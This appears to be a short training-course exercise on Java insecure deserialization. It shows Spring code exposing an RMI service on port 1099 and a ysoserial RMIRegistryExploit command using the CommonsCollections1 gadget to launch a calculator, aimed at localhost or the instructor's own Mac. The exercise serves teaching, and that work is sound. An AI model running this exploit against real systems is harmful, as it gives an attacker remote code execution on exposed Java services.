# Exercise 6 - Insecure Deserialization

In this exercise we are going to exploit a deserialization vulnerability, the vulnerability is actually present in the _commons-collections_ library but can be exploited via an open Java RMI (remote method invocation) interface.

## Enable RMI service 

Java RMI for the Account Service is enabled via the below code:
```java
@Component
public class VBankRmiExporterFactory  {

    public static final int RMI_PORT = 1099;

    @Autowired
    JDBCAccountService implementation;

    @Bean
    RmiServiceExporter exporter() {
        Class<AccountService> serviceInterface = AccountService.class;
        RmiServiceExporter exporter = new RmiServiceExporter();
        exporter.setServiceInterface(serviceInterface);
        exporter.setService(implementation);
        exporter.setServiceName("AccountService");
        exporter.setRegistryPort(RMI_PORT);
        return exporter;
    }

}
```


## Exploit vulnerability

1. download yoserial jar from https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar 
1. run exploit   
```
java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.RMIRegistryExploit myhost 9099 CommonsCollections1 calc.exe
```
Well, this may not run. Please adjust hostname and port to _localhost_ and _1099_ and you need to check the website at https://github.com/frohoff/ysoserial for a
suitable payload (for me CommonsCollections1 works the best)

1. attack my mac, start the calculator in it :)   
I will tell you my IP in class.  
And the path to the executable in Mac OS is: _/Applications/Calculator.app/Contents/MacOS/Calculator_